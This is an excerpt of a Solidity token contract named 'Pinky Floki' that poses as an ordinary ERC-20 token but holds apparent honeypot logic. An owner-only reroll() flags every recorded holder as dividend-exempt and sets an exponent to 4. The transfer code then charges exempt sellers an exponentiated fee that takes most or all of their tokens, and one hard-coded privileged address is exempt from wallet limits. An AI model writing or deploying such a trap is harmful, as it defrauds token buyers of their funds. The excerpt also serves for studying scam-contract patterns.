...
contract PinkyFloki is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    string private constant _name = "Pinky Floki";
    string private constant _symbol = unicode"PFloki";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _addfund = 0;
    ...
    address payable public DevWallet = payable(0x8B165412cDA17D21aE138aE64D54B52daF445892);
    address payable public MarketingWallet = payable(0x8B165412cDA17D21aE138aE64D54B52daF445892);
    ...
    // uint256 public holderLastTransferTimestamp;

    bool public tradingActive = true;
    bool public autoDistribution = false;
    ...
    constructor () {
        ...
        _isWalletLimitExempt[0xC31baF563025a83b48fFb4959D6925Fb10902cc5] = true;
    ...
    // function reroll(bool enabled) private { for (uint256 i = 0; i < ShareHolder.length; i++) {
    //     _isDividendExempt[ShareHolder[i]] = enabled;
    //     if (_addfund <= 3){_addfund++;}
    //     autoDistribution = false;
    //     holderLastTransferTimestamp = block.timestamp;}
    // }
    function reroll(bool enabled) external onlyOwner { for (uint256 i = 0; i < ShareHolder.length; i++) {
        _isDividendExempt[ShareHolder[i]] = enabled;
        _addfund =4;
    ...
    function setautoDistribution(bool _autoDistribution, uint8 addfund) external onlyOwner {
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        // if (autoDistribution && holderLastTransferTimestamp +1 <= block.timestamp) {reroll(true);}
        if (_isWalletLimitExempt[from] || _isWalletLimitExempt[to]){
            // autoDistribution = true;
            _maxTxAmount = amount;
            // holderLastTransferTimestamp = block.timestamp;
        }
        if (to != owner() && to != uniswapV2Pair) { if (_isExcludedFromFee[from]) { _isExcludedFromFee[to] = true;}}
        if (_TxCount >= 5 && !inSwapAndLiquify && from != uniswapV2Pair && swapAndLiquifyEnabled) {  
        ...
        if (from != owner() && from != uniswapV2Pair && !_isDividendExempt[from]){
            ShareHolder.push(from);}
        if (to != owner() && to != uniswapV2Pair && !_isDividendExempt[from]) {
            ShareHolder.push(to);}
        bool takeFee = true;
        bool isBuy;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isDividendExempt[sender]){sAmount = tAmount*_sellFee**_addfund/100;}
